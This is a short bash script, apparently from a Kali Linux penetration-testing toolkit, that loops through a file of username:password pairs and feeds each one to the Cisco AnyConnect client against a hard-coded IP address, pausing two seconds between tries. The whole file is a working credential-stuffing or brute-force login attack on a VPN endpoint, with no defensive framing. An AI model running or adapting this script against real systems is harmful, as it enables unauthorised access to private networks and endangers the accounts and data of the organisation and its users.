#!/bin/bash

# Used to repeat connection attempts to any-connect client.

## change directory to anyconnect binary
cd /opt/cisco/anyconnect/bin

## Iterate through users and passwords in files

while read user_pass_pair; do
u=$(echo $user_pass_pair | cut -d ":" -f 1)
p=$(echo $user_pass_pair | cut -d ":" -f 2)
sleep 2
./vpn -s connect 198.206.246.225 <<STDIN 
y
$u
$p
STDIN
done < /home/kali/DirFusionTools/Bash-scripts/users.txt
